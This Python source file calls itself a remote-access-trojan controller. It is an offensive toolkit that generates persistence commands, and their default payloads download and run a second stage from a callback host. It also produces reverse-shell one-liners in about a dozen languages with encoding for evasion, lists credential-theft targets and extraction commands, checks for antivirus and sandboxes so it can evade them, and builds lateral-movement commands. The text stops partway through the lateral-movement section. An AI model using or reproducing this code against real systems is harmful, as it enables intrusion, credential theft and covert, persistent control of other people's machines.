"""
Storm-Breaker Advanced RAT Controller
Comprehensive remote access toolkit: system recon, persistence, lateral movement,
credential harvesting, anti-forensics, shell generation, and process management.
"""

import os
import re
import json
import time
import random
import string
import hashlib
import base64
import platform
import subprocess
import socket
from datetime import datetime
from collections import defaultdict


# ==========================================
#  1. SYSTEM RECONNAISSANCE ENGINE
# ==========================================

def deep_system_recon():
    """Perform comprehensive system reconnaissance on the host machine"""
    recon = {
        'timestamp': datetime.now().isoformat(),
        'os': {
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'architecture': platform.architecture()[0],
            'hostname': socket.gethostname(),
            'fqdn': socket.getfqdn(),
        },
        'python': {
            'version': platform.python_version(),
            'implementation': platform.python_implementation(),
            'compiler': platform.python_compiler(),
        },
        'network': _get_network_info(),
        'environment': _get_env_vars(),
        'users': _get_user_info(),
        'processes': _get_process_list(),
        'drives': _get_drive_info(),
        'security': _check_security_posture(),
    }
    return recon


def _get_network_info():
    """Gather network interface information"""
    try:
        import psutil
        interfaces = {}
        addrs = psutil.net_if_addrs()
        stats = psutil.net_if_stats()
        for iface, addr_list in addrs.items():
            interfaces[iface] = {
                'addresses': [],
                'is_up': stats.get(iface, None) and stats[iface].isup,
                'speed': stats.get(iface, None) and stats[iface].speed,
                'mtu': stats.get(iface, None) and stats[iface].mtu,
            }
            for addr in addr_list:
                interfaces[iface]['addresses'].append({
                    'family': str(addr.family),
                    'address': addr.address,
                    'netmask': addr.netmask,
                    'broadcast': addr.broadcast,
                })
        return {
            'interfaces': interfaces,
            'connections': _get_active_connections(),
            'hostname': socket.gethostname(),
            'local_ips': _get_local_ips(),
        }
    except Exception as e:
        return {'error': str(e)}


def _get_local_ips():
    """Get all local IP addresses"""
    ips = []
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None):
            ip = info[4][0]
            if ip not in ips and not ip.startswith('::'):
                ips.append(ip)
    except:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        primary = s.getsockname()[0]
        s.close()
        if primary not in ips:
            ips.insert(0, primary)
    except:
        pass
    return ips


def _get_active_connections():
    """Get active network connections"""
    try:
        import psutil
        conns = []
        for c in psutil.net_connections(kind='inet')[:50]:
            conns.append({
                'fd': c.fd,
                'family': str(c.family),
                'type': 'TCP' if c.type == socket.SOCK_STREAM else 'UDP',
                'local': f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else '',
                'remote': f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else '',
                'status': c.status,
                'pid': c.pid,
            })
        return conns
    except:
        return []


def _get_env_vars():
    """Extract interesting environment variables"""
    interesting = [
        'PATH', 'HOME', 'USER', 'USERNAME', 'COMPUTERNAME', 'DOMAIN',
        'USERDOMAIN', 'LOGNAME', 'SHELL', 'TERM', 'LANG', 'HOSTNAME',
        'USERPROFILE', 'APPDATA', 'LOCALAPPDATA', 'TEMP', 'TMP',
        'PROGRAMFILES', 'PROGRAMFILES(X86)', 'SYSTEMROOT', 'WINDIR',
        'COMSPEC', 'OS', 'PROCESSOR_ARCHITECTURE', 'NUMBER_OF_PROCESSORS',
        'SSH_AUTH_SOCK', 'SSH_AGENT_PID', 'DISPLAY', 'XDG_SESSION_TYPE',
        'VIRTUAL_ENV', 'CONDA_PREFIX', 'GOPATH', 'JAVA_HOME',
        'DOCKER_HOST', 'KUBECONFIG', 'AWS_PROFILE', 'AZURE_SUBSCRIPTION_ID',
    ]
    found = {}
    for var in interesting:
        val = os.environ.get(var)
        if val:
            found[var] = val
    return found


def _get_user_info():
    """Get user account information"""
    info = {
        'current_user': os.environ.get('USERNAME', os.environ.get('USER', 'unknown')),
        'home_dir': os.path.expanduser('~'),
        'is_admin': False,
        'groups': [],
    }
    try:
        if platform.system() == 'Windows':
            import ctypes
            info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            info['is_admin'] = os.getuid() == 0
    except:
        pass
    return info


def _get_process_list():
    """Get running processes with details"""
    try:
        import psutil
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status', 'create_time']):
            try:
                info = p.info
                procs.append({
                    'pid': info['pid'],
                    'name': info['name'],
                    'user': info.get('username', ''),
                    'cpu': round(info.get('cpu_percent', 0), 1),
                    'memory': round(info.get('memory_percent', 0), 1),
                    'status': info.get('status', ''),
                    'started': datetime.fromtimestamp(info['create_time']).strftime('%H:%M:%S') if info.get('create_time') else '',
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return sorted(procs, key=lambda x: x.get('cpu', 0), reverse=True)[:100]
    except:
        return []


def _get_drive_info():
    """Get disk/drive information"""
    try:
        import psutil
        drives = []
        for part in psutil.disk_partitions(all=False):
            try:
                usage = psutil.disk_usage(part.mountpoint)
                drives.append({
                    'device': part.device,
                    'mountpoint': part.mountpoint,
                    'fstype': part.fstype,
                    'total_gb': round(usage.total / (1024**3), 2),
                    'used_gb': round(usage.used / (1024**3), 2),
                    'free_gb': round(usage.free / (1024**3), 2),
                    'percent': usage.percent,
                })
            except PermissionError:
                continue
        return drives
    except:
        return []


def _check_security_posture():
    """Check security software and configurations"""
    checks = {
        'antivirus_indicators': [],
        'firewall_status': 'unknown',
        'uac_enabled': False,
        'defender_status': 'unknown',
        'sandbox_indicators': [],
        'vm_indicators': [],
        'debug_indicators': [],
    }

    # Check for AV processes
    av_processes = [
        'avp', 'avgnt', 'avguard', 'bdagent', 'ccsvchst', 'ekrn',
        'fsav32', 'mbam', 'mcshield', 'msmpeng', 'savservice',
        'avastui', 'avastsvc', 'norton', 'sophos', 'cylance',
        'crowdstrike', 'csfalcon', 'sentinel', 'carbon', 'cb',
    ]

    # Check for sandbox indicators
    sandbox_indicators = [
        'vmtoolsd', 'vmwaretray', 'vboxservice', 'vboxtray',
        'sandboxie', 'wireshark', 'procmon', 'procexp', 'ollydbg',
        'x64dbg', 'ida', 'immunity', 'fiddler', 'charles',
    ]

    # Check for VM indicators
    vm_checks = {
        'hostname': socket.gethostname().lower(),
        'mac_prefixes': ['00:0c:29', '00:50:56', '08:00:27', '00:1c:42'],
    }

    try:
        import psutil
        running = [p.name().lower() for p in psutil.process_iter(['name'])]
        checks['antivirus_indicators'] = [p for p in av_processes if any(p in r for r in running)]
        checks['sandbox_indicators'] = [p for p in sandbox_indicators if any(p in r for r in running)]
    except:
        pass

    # VM hostname check
    vm_names = ['sandbox', 'malware', 'virus', 'sample', 'test', 'vmware', 'virtual']
    hostname = socket.gethostname().lower()
    checks['vm_indicators'] = [n for n in vm_names if n in hostname]

    return checks


# ==========================================
#  2. PERSISTENCE MECHANISM GENERATOR
# ==========================================

def generate_persistence(os_type='windows', method='all', payload_cmd='', callback_url=''):
    """Generate persistence mechanisms for target OS"""
    if os_type == 'windows':
        return _windows_persistence(method, payload_cmd, callback_url)
    else:
        return _linux_persistence(method, payload_cmd, callback_url)


def _windows_persistence(method, payload_cmd, callback_url):
    """Generate Windows persistence scripts"""
    methods = {}

    payload = payload_cmd or f'powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'{callback_url}/stage2\')"'

    if method in ('all', 'registry'):
        methods['registry_run'] = {
            'name': 'Registry Run Key',
            'risk_level': 'medium',
            'survival': 'user_login',
            'detection': 'moderate',
            'description': 'Adds payload to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            'install_cmd': f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "{payload}" /f',
            'cleanup_cmd': 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /f',
            'detection_notes': 'Visible in autoruns, Sysinternals tools, and registry monitoring',
        }

    if method in ('all', 'scheduled_task'):
        methods['scheduled_task'] = {
            'name': 'Scheduled Task',
            'risk_level': 'medium',
            'survival': 'reboot',
            'detection': 'moderate',
            'description': 'Creates a scheduled task that runs at logon and every 30 minutes',
            'install_cmd': f'schtasks /create /tn "MicrosoftEdgeUpdate" /tr "{payload}" /sc onlogon /rl highest /f && schtasks /create /tn "MicrosoftEdgeSync" /tr "{payload}" /sc minute /mo 30 /f',
            'cleanup_cmd': 'schtasks /delete /tn "MicrosoftEdgeUpdate" /f && schtasks /delete /tn "MicrosoftEdgeSync" /f',
            'detection_notes': 'Visible via schtasks /query, Task Scheduler GUI, event logs',
        }

    if method in ('all', 'startup_folder'):
        methods['startup_folder'] = {
            'name': 'Startup Folder',
            'risk_level': 'low',
            'survival': 'user_login',
            'detection': 'easy',
            'description': 'Places a .bat script in the user Startup folder',
            'install_cmd': f'echo @echo off > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat" && echo {payload} >> "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat"',
            'cleanup_cmd': 'del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat"',
            'detection_notes': 'Easily found by checking startup folder or autoruns',
        }

    if method in ('all', 'wmi_event'):
        methods['wmi_event'] = {
            'name': 'WMI Event Subscription',
            'risk_level': 'high',
            'survival': 'reboot',
            'detection': 'hard',
            'description': 'Creates a WMI permanent event subscription that triggers on system startup',
            'install_cmd': f'''powershell -ep bypass -c "
$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='SysUpdate';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\"Win32_PerfFormattedData_PerfOS_System\\"'}}
$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='SysUpdate';CommandLineTemplate='{payload}'}}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$filter;Consumer=$consumer}}"''',
            'cleanup_cmd': 'powershell -c "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \\"Name=\'SysUpdate\'\\" | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \\"Name=\'SysUpdate\'\\" | Remove-WmiObject"',
            'detection_notes': 'Hard to detect - requires WMI repository analysis',
        }

    if method in ('all', 'service'):
        methods['windows_service'] = {
            'name': 'Windows Service',
            'risk_level': 'high',
            'survival': 'reboot',
            'detection': 'moderate',
            'description': 'Creates a Windows service that auto-starts',
            'install_cmd': f'sc create "WinDefenderUpdate" binPath= "{payload}" start= auto DisplayName= "Windows Defender Update Service" && sc start "WinDefenderUpdate"',
            'cleanup_cmd': 'sc stop "WinDefenderUpdate" && sc delete "WinDefenderUpdate"',
            'detection_notes': 'Visible via services.msc, sc query, and service event logs',
        }

    if method in ('all', 'dll_hijack'):
        methods['dll_hijack'] = {
            'name': 'DLL Search Order Hijacking',
            'risk_level': 'critical',
            'survival': 'app_launch',
            'detection': 'very_hard',
            'description': 'Plants a malicious DLL in a location searched before the legitimate one',
            'technique': 'T1574.001',
            'common_targets': [
                {'app': 'Microsoft Teams', 'dll': 'dbghelp.dll', 'path': '%LOCALAPPDATA%\\Microsoft\\Teams\\'},
                {'app': 'Slack', 'dll': 'wtsapi32.dll', 'path': '%LOCALAPPDATA%\\slack\\'},
                {'app': 'Discord', 'dll': 'ffmpeg.dll', 'path': '%LOCALAPPDATA%\\Discord\\'},
                {'app': 'VS Code', 'dll': 'WINSTA.dll', 'path': '%LOCALAPPDATA%\\Programs\\Microsoft VS Code\\'},
            ],
            'detection_notes': 'Requires monitoring DLL loads and comparing hashes',
        }

    return {
        'os': 'windows',
        'methods': methods,
        'total_methods': len(methods),
        'generated_at': datetime.now().isoformat(),
    }


def _linux_persistence(method, payload_cmd, callback_url):
    """Generate Linux persistence scripts"""
    methods = {}

    payload = payload_cmd or f'bash -c "curl -s {callback_url}/stage2 | bash"'

    if method in ('all', 'crontab'):
        methods['crontab'] = {
            'name': 'Crontab Entry',
            'risk_level': 'medium',
            'survival': 'reboot',
            'detection': 'moderate',
            'description': 'Adds a cron job that executes every 15 minutes',
            'install_cmd': f'(crontab -l 2>/dev/null; echo "*/15 * * * * {payload}") | crontab -',
            'cleanup_cmd': 'crontab -l | grep -v "stage2" | crontab -',
            'detection_notes': 'Visible via crontab -l, /var/spool/cron/',
        }

    if method in ('all', 'bashrc'):
        methods['bashrc'] = {
            'name': '.bashrc / .profile Backdoor',
            'risk_level': 'low',
            'survival': 'user_login',
            'detection': 'easy',
            'description': 'Appends payload to user shell profile files',
            'install_cmd': f'echo \'{payload} &\' >> ~/.bashrc && echo \'{payload} &\' >> ~/.profile',
            'cleanup_cmd': 'sed -i "/stage2/d" ~/.bashrc ~/.profile',
            'detection_notes': 'Found by reading shell profile files',
        }

    if method in ('all', 'systemd'):
        methods['systemd_service'] = {
            'name': 'Systemd Service',
            'risk_level': 'high',
            'survival': 'reboot',
            'detection': 'moderate',
            'description': 'Creates a systemd service unit for persistence',
            'install_cmd': f'''cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{payload}'
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable system-update.service && systemctl start system-update.service''',
            'cleanup_cmd': 'systemctl stop system-update.service && systemctl disable system-update.service && rm /etc/systemd/system/system-update.service && systemctl daemon-reload',
            'detection_notes': 'Visible via systemctl list-units, service files in /etc/systemd/',
        }

    if method in ('all', 'ssh_key'):
        methods['ssh_authorized_keys'] = {
            'name': 'SSH Authorized Keys',
            'risk_level': 'high',
            'survival': 'permanent',
            'detection': 'moderate',
            'description': 'Adds an attacker SSH public key for persistent remote access',
            'install_cmd': 'mkdir -p ~/.ssh && echo "ssh-rsa AAAA[ATTACKER_PUBLIC_KEY] update@system" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys',
            'cleanup_cmd': 'sed -i "/update@system/d" ~/.ssh/authorized_keys',
            'detection_notes': 'Check ~/.ssh/authorized_keys for unknown keys',
        }

    if method in ('all', 'ld_preload'):
        methods['ld_preload'] = {
            'name': 'LD_PRELOAD Hijacking',
            'risk_level': 'critical',
            'survival': 'permanent',
            'detection': 'very_hard',
            'description': 'Uses LD_PRELOAD to inject a shared library into every process',
            'technique': 'T1574.006',
            'concept': 'Compile a shared object that hooks common functions (e.g., accept, read) and loads it via /etc/ld.so.preload',
            'install_cmd': 'echo "/lib/x86_64-linux-gnu/libsystem.so" >> /etc/ld.so.preload',
            'cleanup_cmd': 'sed -i "/libsystem/d" /etc/ld.so.preload',
            'detection_notes': 'Check /etc/ld.so.preload and compare library hashes',
        }

    if method in ('all', 'pam_backdoor'):
        methods['pam_backdoor'] = {
            'name': 'PAM Backdoor',
            'risk_level': 'critical',
            'survival': 'permanent',
            'detection': 'very_hard',
            'description': 'Patches PAM module to accept a universal password alongside normal auth',
            'technique': 'T1556.003',
            'concept': 'Modify pam_unix.so to accept a hardcoded password for any user while logging normal credentials',
            'detection_notes': 'Compare pam_unix.so hash against known-good, monitor PAM config changes',
        }

    return {
        'os': 'linux',
        'methods': methods,
        'total_methods': len(methods),
        'generated_at': datetime.now().isoformat(),
    }


# ==========================================
#  3. REVERSE SHELL GENERATOR
# ==========================================

def generate_reverse_shell(shell_type='all', lhost='', lport='4444', encoding='none'):
    """Generate reverse shell one-liners for various languages"""
    shells = {}

    if shell_type in ('all', 'bash'):
        shells['bash_tcp'] = {
            'name': 'Bash TCP',
            'language': 'bash',
            'requires': 'bash, /dev/tcp',
            'command': f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            'encoded': _encode_payload(f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1', encoding),
        }
        shells['bash_udp'] = {
            'name': 'Bash UDP',
            'language': 'bash',
            'requires': 'bash, /dev/udp',
            'command': f'bash -i >& /dev/udp/{lhost}/{lport} 0>&1',
        }

    if shell_type in ('all', 'python'):
        py_shell = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''''
        shells['python'] = {
            'name': 'Python3',
            'language': 'python',
            'requires': 'python3',
            'command': py_shell,
            'encoded': _encode_payload(py_shell, encoding),
        }

    if shell_type in ('all', 'powershell'):
        ps_shell = f'''powershell -nop -W hidden -noni -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''
        shells['powershell'] = {
            'name': 'PowerShell',
            'language': 'powershell',
            'requires': 'PowerShell',
            'command': ps_shell,
            'encoded': _encode_payload(ps_shell, encoding),
        }

    if shell_type in ('all', 'php'):
        shells['php'] = {
            'name': 'PHP',
            'language': 'php',
            'requires': 'php',
            'command': f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
        }

    if shell_type in ('all', 'ruby'):
        shells['ruby'] = {
            'name': 'Ruby',
            'language': 'ruby',
            'requires': 'ruby',
            'command': f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
        }

    if shell_type in ('all', 'perl'):
        shells['perl'] = {
            'name': 'Perl',
            'language': 'perl',
            'requires': 'perl',
            'command': f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
        }

    if shell_type in ('all', 'netcat'):
        shells['netcat_e'] = {
            'name': 'Netcat -e',
            'language': 'netcat',
            'requires': 'netcat (traditional)',
            'command': f'nc -e /bin/sh {lhost} {lport}',
        }
        shells['netcat_mkfifo'] = {
            'name': 'Netcat mkfifo',
            'language': 'netcat',
            'requires': 'netcat (any version)',
            'command': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
        }

    if shell_type in ('all', 'java'):
        shells['java'] = {
            'name': 'Java',
            'language': 'java',
            'requires': 'java',
            'command': f'''Runtime r = Runtime.getRuntime(); String[] cmd = {{"/bin/bash","-c","bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}}; Process p = r.exec(cmd);''',
        }

    if shell_type in ('all', 'node'):
        shells['nodejs'] = {
            'name': 'Node.js',
            'language': 'javascript',
            'requires': 'node',
            'command': f'''node -e '(function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({lport},"{lhost}",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();' ''',
        }

    if shell_type in ('all', 'golang'):
        shells['golang'] = {
            'name': 'Go (inline)',
            'language': 'go',
            'requires': 'go',
            'command': f'''echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/r.go && go run /tmp/r.go''',
        }

    if shell_type in ('all', 'msfvenom'):
        shells['msfvenom_linux'] = {
            'name': 'msfvenom Linux x64',
            'language': 'msfvenom',
            'requires': 'msfvenom',
            'command': f'msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/shell',
        }
        shells['msfvenom_windows'] = {
            'name': 'msfvenom Windows x64',
            'language': 'msfvenom',
            'requires': 'msfvenom',
            'command': f'msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe',
        }
        shells['msfvenom_web'] = {
            'name': 'msfvenom PHP Web Shell',
            'language': 'msfvenom',
            'requires': 'msfvenom',
            'command': f'msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o shell.php',
        }

    return {
        'shells': shells,
        'total': len(shells),
        'listener_command': f'nc -lvnp {lport}',
        'lhost': lhost,
        'lport': lport,
        'generated_at': datetime.now().isoformat(),
    }


def _encode_payload(payload, encoding):
    """Encode payload for evasion"""
    if encoding == 'base64':
        encoded = base64.b64encode(payload.encode()).decode()
        return f'echo {encoded} | base64 -d | bash'
    elif encoding == 'url':
        from urllib.parse import quote
        return quote(payload)
    elif encoding == 'hex':
        return payload.encode().hex()
    elif encoding == 'powershell_b64':
        import base64 as b64
        encoded = b64.b64encode(payload.encode('utf-16-le')).decode()
        return f'powershell -enc {encoded}'
    return payload


# ==========================================
#  4. CREDENTIAL HARVESTING TEMPLATES
# ==========================================

def get_credential_harvest_targets():
    """Get credential harvesting target locations and techniques"""
    return {
        'browser_credentials': {
            'chrome': {
                'name': 'Google Chrome',
                'icon': '🌐',
                'windows': {
                    'login_data': '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data',
                    'cookies': '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies',
                    'history': '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History',
                    'local_state': '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State',
                    'bookmarks': '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Bookmarks',
                },
                'linux': {
                    'login_data': '~/.config/google-chrome/Default/Login Data',
                    'cookies': '~/.config/google-chrome/Default/Cookies',
                    'history': '~/.config/google-chrome/Default/History',
                },
                'method': 'SQLite3 + DPAPI/keyring decryption',
            },
            'firefox': {
                'name': 'Mozilla Firefox',
                'icon': '🦊',
                'windows': {
                    'logins': '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default*\\logins.json',
                    'key_db': '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default*\\key4.db',
                    'cookies': '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default*\\cookies.sqlite',
                },
                'linux': {
                    'logins': '~/.mozilla/firefox/*.default*/logins.json',
                    'key_db': '~/.mozilla/firefox/*.default*/key4.db',
                },
                'method': 'NSS library / key4.db decryption',
            },
            'edge': {
                'name': 'Microsoft Edge',
                'icon': '🔵',
                'windows': {
                    'login_data': '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data',
                    'cookies': '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cookies',
                },
                'method': 'Same as Chrome (Chromium-based)',
            },
        },
        'wifi_credentials': {
            'windows': {
                'list_cmd': 'netsh wlan show profiles',
                'extract_cmd': 'netsh wlan show profile name="{SSID}" key=clear',
                'batch_extract': 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @if "%j" NEQ "" (netsh wlan show profiles name="%j" key=clear | findstr "Key Content")',
            },
            'linux': {
                'list_cmd': 'ls /etc/NetworkManager/system-connections/',
                'extract_cmd': 'cat /etc/NetworkManager/system-connections/{SSID}.nmconnection',
                'method': 'Read NetworkManager config files (requires root)',
            },
        },
        'ssh_keys': {
            'locations': [
                '~/.ssh/id_rsa', '~/.ssh/id_ed25519', '~/.ssh/id_ecdsa',
                '~/.ssh/id_dsa', '~/.ssh/config', '~/.ssh/known_hosts',
                '~/.ssh/authorized_keys',
            ],
            'windows_putty': {
                'registry': 'HKCU\\Software\\SimonTatham\\PuTTY\\Sessions',
                'keys': '%USERPROFILE%\\.ssh\\',
            },
        },
        'system_credentials': {
            'windows': {
                'sam_database': 'C:\\Windows\\System32\\config\\SAM',
                'lsa_secrets': 'registry HKLM\\SECURITY\\Policy\\Secrets',
                'cached_domain': 'reg query "HKLM\\SECURITY\\Cache"',
                'credential_manager': 'cmdkey /list',
                'dpapi_master_keys': '%APPDATA%\\Microsoft\\Protect\\',
                'mimikatz': 'sekurlsa::logonpasswords',
            },
            'linux': {
                'shadow': '/etc/shadow',
                'passwd': '/etc/passwd',
                'sudoers': '/etc/sudoers',
                'bash_history': '~/.bash_history',
                'gnome_keyring': '~/.local/share/keyrings/',
                'kde_wallet': '~/.local/share/kwalletd/',
            },
        },
        'cloud_tokens': {
            'aws': {
                'credentials': '~/.aws/credentials',
                'config': '~/.aws/config',
                'env_vars': ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN'],
            },
            'azure': {
                'tokens': '~/.azure/accessTokens.json',
                'profile': '~/.azure/azureProfile.json',
                'env_vars': ['AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID'],
            },
            'gcp': {
                'credentials': '~/.config/gcloud/credentials.db',
                'config': '~/.config/gcloud/properties',
                'env_vars': ['GOOGLE_APPLICATION_CREDENTIALS', 'CLOUDSDK_CONFIG'],
            },
            'docker': {
                'config': '~/.docker/config.json',
            },
            'kubernetes': {
                'config': '~/.kube/config',
            },
        },
    }


# ==========================================
#  5. LATERAL MOVEMENT GENERATOR
# ==========================================

def generate_lateral_movement(technique='all', target_host='', username='', password='', domain=''):
    """Generate lateral movement command templates"""
    movements = {}

    if technique in ('all', 'psexec'):
        movements['psexec'] = {
            'name': 'PsExec',
            'risk_level': 'high',
            'noise_level': 'high',
            'description': 'Remote execution via SMB admin shares and Windows service',
            'mitre': 'T1569.002',
            'commands': {
                'sysinternals': f'PsExec.exe \\\\{target_host} -u {domain}\\{username} -p {password} cmd.exe',
                'impacket': f'impacket-psexec {domain}/{username}:{password}@{target_host}',
                'metasploit': f'use exploit/windows/smb/psexec\nset RHOSTS {target_host}\nset SMBUser {username}\nset SMBPass {password}\nset SMBDomain {domain}\nrun',
            },
            'detection': 'Event ID 7045 (new service), SMB connections, ADMIN$ access',
        }

    if technique in ('all', 'wmiexec'):
        movements['wmiexec'] = {
            'name': 'WMI Execution',
            'risk_level': 'high',
            'noise_level': 'medium',
            'description': 'Remote command execution via WMI',
            'mitre': 'T1047',
            'commands': {
                'impacket': f'impacket-wmiexec {domain}/{username}:{password}@{target_host}',
                'powershell': f'Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName {target_host} -Credential (New-Object PSCredential("{domain}\\{username}", (ConvertTo-SecureString "{password}" -AsPlainText -Force)))',
                'wmic': f'wmic /node:{target_host} /user:{domain}\\{username} /password:{password} process call create "cmd.exe /c whoami > C:\\temp\\output.txt"',
            },
            'detection': 'WMI activity logs, process creation events',
        }

    if technique in ('all', 'winrm'):
        movements['winrm'] = {
            'name': 'WinRM / PS Remoting',
            'risk_level': 'medium',
            'noise_level': 'low',
            'description': 'Remote PowerShell execution via WinRM',
            'mitre': 'T1021.006',
            'commands': {
                'powershell': f'$cred = New-Object PSCredential("{domain}\\{username}", (ConvertTo-SecureString "{password}" -AsPlainText -Force)); Invoke-Command -ComputerName {target_host} -Credential $cred -ScriptBlock {{ whoami; hostname }}',
                'evil_winrm': f'evil-winrm -i {target_host} -u {username} -p {password}',
            },
            'detection': 'Windows Remote Management logs, PowerShell script block logging',
        }

    if technique in ('all', 'rdp'):
        movements['rdp'] = {
            'name': 'RDP Hijacking',
            'risk_level': 'critical',
            'noise_level': 'low',
            'description': 'Hijack existing RDP sessions or create new ones',
            'mitre': 'T1563.002',
            'commands': {
                'connect': f'mstsc /v:{target_host}',
                'hijack': f'tscon {{TARGET_SESSION_ID}} /dest:rdp-tcp#{{YOUR_SESSION}}',
                'enable_rdp': f'reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f && netsh advfirewall firewall add rule name="RDP" dir=in protocol=tcp localport=3389 action=allow',
                'xfreerdp': f'xfreerdp /v:{target_host} /u:{domain}\\{username} /p:{password} /cert:ignore',
            },
            'detection': 'RDP connection logs (Event ID 4624 Type 10), Terminal Services logs',
        }

    if technique in ('all', 'ssh_lateral'):
        movements['ssh'] = {
            'name': 'SSH Lateral Movement',
            'risk_level': 'medium',
            'noise_level': 'low',
            'description': 'Move laterally using SSH with credentials or keys',
            'mitre': 'T1021.004',
            'commands': {
                'password': f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no {username}@{target_host}',
                'key': f'ssh -i ~/.ssh/stolen_key -o StrictHostKeyChecking=no {username}@{target_host}',
                'tunnel': f'ssh -L 8080:{target_host}:80 -N {username}@{target_host}',
                'socks': f'ssh -D 1080 -N {username}@{target_host}',
                'proxy_chain': f'proxychains ssh {username}@{target_host}',
            },
            'detection': 'SSH auth logs (/var/log/auth.log), failed login attempts',
        }

    if technique in ('all', 'dcom'):
        movements['dcom'] = {
            'name': 'DCOM Execution',
            'risk_level': 'high',
            'noise_level': 'medium',
            'description': 'Remote execution via Distributed COM objects',
            'mitre': 'T1021.003',
            'commands': {
                'mmc': f'impacket-dcomexec -object MMC20 {domain}/{username}:{password}@{target_host}',
                'shellwindows': f'impacket-dcomexec -object ShellWindows {domain}/{username}:{password}@{target_host}',
                'shellbrowserwindow': f'impacket-dcomexec -object ShellBrowserWindow {domain}/{username}:{password}@{target_host}',
            },
            'detection': 'DCOM event logs, unusual network connections',
